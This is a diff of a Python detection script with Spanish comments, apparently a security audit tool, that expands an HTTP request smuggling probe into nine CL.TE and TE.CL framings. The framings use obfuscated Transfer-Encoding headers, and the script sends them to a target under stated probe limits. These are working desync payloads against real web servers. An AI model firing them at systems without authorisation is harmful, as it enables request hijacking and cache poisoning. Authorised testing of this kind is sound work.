@@ -1,27 +1,48 @@
 #!/usr/bin/env python3
-"""EDGESYNC-HUNT (v0.72.0): detector de desync edge->back (HTTP
-request smuggling) por tecnica del ECO.
+"""EDGESYNC-HUNT (v0.73.0): bateria de 9 framings para desync
+edge->back (HTTP request smuggling), tecnica del ECO.
 
-Filosofia (Kettle): el front y el back negocian distinto donde
-termina un request (CL vs TE). Si mandamos un POST ambiguo cuyo
-CL cubre TODO el request smuggleado, el front lo ve como CUERPO
-(nunca como request), pero un back que prefiera TE lo ejecuta
-como request propio. El ECO: recibimos una respuesta extra que
-nunca pedimos.
+Filosofia (Kettle): front y backend discrepan sobre donde termina
+un request (CL vs TE). Cada parser cae en un framing distinto y
+cada obfuscacion de header la resuelve a su manera: una sola
+sonda no basta, por eso aqui hay NUEVE.
+
+Variantes:
+  familia CL.TE (smuggle dentro de la ventana CL, invisible al
+  front CL; un back TE lo ejecuta como request propio):
+    V1 CL+TE clasico
+    V3 TE duplicado (dos TE:chunked)
+    V4 espacio antes de los dos puntos ("Transfer-Encoding :")
+    V5 identity+chunked (dos TE contradictorios)
+    V6 tab tras los dos puntos ("Transfer-Encoding:\\tchunked")
+    V7 mayusculas ofuscadas ("tRansfer-EnCoDiNg: ChUnKeD")
+    V8 mixto (espacio + duplicado)
+  familia TE.CL (smuggle dentro del data de un chunk, invisible
+  al front TE; un back CL lo ejecuta porque su CL corto corta el
+  framing):
+    V2 TE.CL invertido (CL cubre solo la linea de tamano)
+    V9 TE.CL con extension de chunk + hex mayuscula
 
 Senales:
-  DESYNC-DEMO   el marker del request smuggleado aparece en una
-                respuesta (bug demostrado, lectura A->B)
-  SOSPECHA      numero de respuestas distinto al esperado (2)
-  SIN-DESYNC    todo cuadra (2 respuestas, sin marker)
+  DESYNC-DEMO    eco del marker REPRODUCIBLE (familia CL.TE)
+  TECL-CANDIDATO eco en familia TE.CL: desync o pipelining
+                 (ambiguo sin prueba cruzada; se lista, no
+                 dictamina DEMO)
+  SOSPECHA       conteo de respuestas anormal sin eco
+  SIN-DESYNC     todo cuadra
+
+Interpretacion honesta: un eco CL.TE asume front CL; un front que
+honre TE estricto puede reflejar pipelining. En blancos reales
+con CDN (front normalizado) la senal DEMO es solida; en fronts
+TE puros, contrastar con conteo y diferencial.
 
 SEGURIDAD (anti-DoS, no negociable):
-  - max MAX_PROBES conexiones/probes por target (default 10)
-  - 1 sola conexion por corrida, secuencial
-  - pausa COOLDOWN entre probes
-  - NO loops, NO flood, NO RST, cuerpo <= 4KB
-  - verificacion A->B: solo se LEE, nunca se modifica estado del
-    target (el path smuggleado es de lectura)
+  - MAX_PROBES pruebas totales (baseline + 9 + 1 reproduccion)
+  - 1 conexion por variante, secuencial, cooldown entre probes
+  - NO loops, NO flood, NO RST, cuerpos <= 4KB
+  - stop al primer DESYNC-DEMO (no se insiste contra un blanco
+    ya demostrado)
+  - lectura A->B: el path smuggleado es de solo lectura
 """
 import argparse
 import json
@@ -30,12 +51,20 @@ import ssl
 import time
 from urllib.parse import urlparse
 
-MAX_PROBES = 10
+MAX_PROBES = 12
 COOLDOWN = 0.4
 MAX_BODY = 4096
 
 SMUG_PATH = "/x-edgesync-sonde-{}"
 SMUG_MARKER = "x-edgesync-echo"
+
+# id -> familia
+VARIANTES = {
+    "V1": "CLTE", "V2": "TECL", "V3": "CLTE", "V4": "CLTE",
+    "V5": "CLTE", "V6": "CLTE", "V7": "CLTE", "V8": "CLTE",
+    "V9": "TECL",
+}
+ORDEN = ["V1", "V2", "V3", "V4", "V5", "V6", "V7", "V8", "V9"]
 
 
 def _connect(url, timeout=10.0):
@@ -63,91 +92,175 @@ def _read_all(sock, quiet=0.8, cap=65535):
     return out
 
 
-def _split_responses(raw):
-    return raw.split(b"HTTP/1.1 ")
+def _n_responses(raw):
+    return max(0, sum(1 for p in raw.split(b"HTTP/1.1 ")
+                      if b" " in p[:32]))
 
 
-def _resp_text(raw):
-    return raw.decode("latin-1", errors="replace")
+def _smug(host, smug_path):
+    return (f"GET {smug_path} HTTP/1.1\r\n"
+            f"Host: {host}\r\n"
+            f"X-Echo: {SMUG_MARKER}\r\n\r\n").encode()
 
 
-def _build_probe(host, smug_path):
-    smuggled = (f"GET {smug_path} HTTP/1.1\r\n"
-                f"Host: {host}\r\n"
-                f"X-Echo: {SMUG_MARKER}\r\n\r\n").encode()
-    body = b"0\r\n\r\n" + smuggled
+def build_probe(vid, host, smug_path):
+    """Devuelve (probe, sonda, familia)."""
+    smug = _smug(host, smug_path)
+    if vid == "V1":
+        body = b"0\r\n\r\n" + smug
+        te = b"Transfer-Encoding: chunked\r\n"
+        cl = len(body)
+    elif vid == "V2":
+        hexline = hex(len(smug)).encode()
+        body = hexline + b"\r\n" + smug + b"\r\n0\r\n\r\n"
+        te = b"Transfer-Encoding: chunked\r\n"
+        cl = len(hexline) + 2
+    elif vid == "V3":
+        body = b"0\r\n\r\n" + smug
+        te = b"Transfer-Encoding: chunked\r\n" \
+             b"Transfer-Encoding: chunked\r\n"
+        cl = len(body)
+    elif vid == "V4":
+        body = b"0\r\n\r\n" + smug
+        te = b"Transfer-Encoding : chunked\r\n"
+        cl = len(body)
+    elif vid == "V5":
+        body = b"0\r\n\r\n" + smug
+        te = b"Transfer-Encoding: identity\r\n" \
+             b"Transfer-Encoding: chunked\r\n"
+        cl = len(body)
+    elif vid == "V6":
+        body = b"0\r\n\r\n" + smug
+        te = b"Transfer-Encoding:\tchunked\r\n"
+        cl = len(body)
+    elif vid == "V7":
+        body = b"0\r\n\r\n" + smug
+        te = b"tRansfer-EnCoDiNg: ChUnKeD\r\n"
+        cl = len(body)
+    elif vid == "V8":
+        body = b"0\r\n\r\n" + smug
+        te = b"Transfer-Encoding : chunked\r\n" \
+             b"Transfer-Encoding : chunked\r\n"
+        cl = len(body)
+    elif vid == "V9":
+        extline = hex(len(smug)).upper().encode() + b";x=1"
+        body = extline + b"\r\n" + smug + b"\r\n0\r\n\r\n"
+        te = b"Transfer-Encoding: chunked\r\n"
+        cl = len(extline) + 2
+    else:
+        raise ValueError(f"variante desconocida: {vid}")
     if len(body) > MAX_BODY:
         raise ValueError("cuerpo excede tope anti-DoS")
     probe = (b"POST / HTTP/1.1\r\n"
              b"Host: " + host.encode() + b"\r\n"
-             b"Content-Length: " + str(len(body)).encode() + b"\r\n"
-             b"Transfer-Encoding: chunked\r\n"
+             b"Content-Length: " + str(cl).encode() + b"\r\n"
+             + te +
              b"Content-Type: application/x-www-form-urlencoded\r\n\r\n"
              + body)
     sonda = (f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n").encode()
-    return probe, sonda
+    return probe, sonda, VARIANTES[vid]
+
+
+def _disparar(url, vid, timeout, smug_path):
+    """Un probe-test: 1 conexion, probe + sonda. Devuelve dict."""
+    s, host = _connect(url, timeout)
+    try:
+        probe, sonda, familia = build_probe(vid, host, smug_path)
+        s.sendall(probe)
+        time.sleep(COOLDOWN)
+        s.sendall(sonda)
+        raw = _read_all(s, quiet=1.2)
+    finally:
+        s.close()
+    txt = raw.decode("latin-1", errors="replace")
+    import re as _re
+    status = [x.decode() for x in _re.findall(rb"HTTP/1\.1 (\d{3})", raw)]
+    return {
+        "variante": vid,
+        "familia": familia,
+        "respuestas": _n_responses(raw),
+        "eco": smug_path in txt or SMUG_MARKER in txt,
+        "status": status,
+        "bytes": len(raw),
+    }
 
 
 def audit(cfg):
-    """cfg: url, timeout. Devuelve veredicto + evidencia.
-    Presupuesto cerrado: 3 requests totales (baseline+probe+sonda).
-    """
+    """cfg: url, timeout, variant (opcional: solo una variante).
+    Devuelve veredicto + evidencia. Presupuesto cerrado."""
     url = cfg["url"]
     timeout = float(cfg.get("timeout", 10.0))
+    solo = cfg.get("variant")
     smug_path = cfg.get("smug_path") or SMUG_PATH.format(int(time.time()))
-    host_header = urlparse(url if "//" in url else "http://" + url).hostname
+    orden = [solo] if solo else ORDEN
 
     probes = 0
     evid = {"url": url, "probes": probes, "max_probes": MAX_PROBES,
-            "smug_path": smug_path}
+            "smug_path": smug_path, "tecl_candidatos": [],
+            "conteos_anormales": []}
 
-    # fase 1: baseline (el target debe responder)
+    # baseline: el target debe responder
     s, host = _connect(url, timeout)
     probes += 1
-    s.sendall(f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n".encode())
-    base = _read_all(s)
-    s.close()
+    try:
+        s.sendall(f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n".encode())
+        base = _read_all(s)
+    finally:
+        s.close()
     time.sleep(COOLDOWN)
     if not base.strip():
+        evid["probes"] = probes
         return {"veredicto": "NO-RESPONDE", "evidencia": evid}
 
-    # fase 2: probe ambiguo + sonda en la MISMA conexion
-    s, host = _connect(url, timeout)
-    probes += 1
-    probe, sonda = _build_probe(host_header, smug_path)
-    s.sendall(probe)
-    time.sleep(COOLDOWN)
-    s.sendall(sonda)                      # probe extra dentro del budget
-    probes += 1
-    evid["probes"] = probes
-    raw = _read_all(s, quiet=1.2)
-    s.close()
+    for vid in orden:
+        if probes >= MAX_PROBES:
+            evid["nota_presupuesto"] = "presupuesto agotado"
+            break
+        r = _disparar(url, vid, timeout, smug_path)
+        probes += 1
+        evid["probes"] = probes
 
-    parts = _split_responses(raw)
-    n_resp = len(parts) - 1 if parts and parts[0] == b"" else len(parts)
-    n_resp = max(0, sum(1 for p in parts if b" " in p[:32]))
-    evid["respuestas"] = n_resp
-    txt = _resp_text(raw)
-    hit = smug_path in txt or SMUG_MARKER in txt
-    evid["marker_presente"] = hit
-    evid["cuerpo_crudo_len"] = len(raw)
+        if r["eco"] and r["familia"] == "CLTE":
+            # reproduccion obligatoria antes de DEMO
+            r2 = _disparar(url, vid, timeout, smug_path + "-r")
+            probes += 1
+            evid["probes"] = probes
+            if r2["eco"]:
+                evid["variante_demo"] = vid
+                evid["repro"] = True
+                return {"veredicto": "DESYNC-DEMO", "evidencia": evid}
+            evid["eco_no_reproducido"] = vid
+        elif r["eco"] and r["familia"] == "TECL":
+            # ambiguo: desync TE.CL o pipelining del front
+            evid["tecl_candidatos"].append(vid)
+            continue
+        if r["respuestas"] != 2 and not r["eco"]:
+            # rechazo activo del front (400/405/501...) = buena
+            # postura, no sospecha: lo registramos aparte
+            if (r["respuestas"] == 1 and r.get("status")
+                    and r["status"][0] in {"400", "405", "411",
+                                           "413", "501", "505"}):
+                evid.setdefault("front_rechazos", []).append(vid)
+            else:
+                evid["conteos_anormales"].append(
+                    {"variante": vid, "respuestas": r["respuestas"]})
 
-    if hit:
-        return {"veredicto": "DESYNC-DEMO", "evidencia": evid}
-    if n_resp != 2:
-        evid["nota"] = ("conteo de respuestas distinto de 2: posible "
-                        "desync parcial o front tipo h2")
+    if evid.get("eco_no_reproducido"):
+        return {"veredicto": "SOSPECHA", "evidencia": evid}
+    if evid["conteos_anormales"]:
         return {"veredicto": "SOSPECHA", "evidencia": evid}
     return {"veredicto": "SIN-DESYNC", "evidencia": evid}
 
 
 def main():
-    ap = argparse.ArgumentParser(description="EDGESYNC desync detector")
+    ap = argparse.ArgumentParser(
+        description="EDGESYNC bateria de desync (9 framings)")
     ap.add_argument("url", help="http://target[:puerto]/")
     ap.add_argument("--timeout", type=float, default=10.0)
+    ap.add_argument("--variant", help="solo una variante (V1..V9)")
     ap.add_argument("--json", action="store_true")
     a = ap.parse_args()
-    r = audit({"url": a.url, "timeout": a.timeout})
+    r = audit({"url": a.url, "timeout": a.timeout, "variant": a.variant})
     if a.json:
         print(json.dumps(r, indent=2, default=str))
     else:
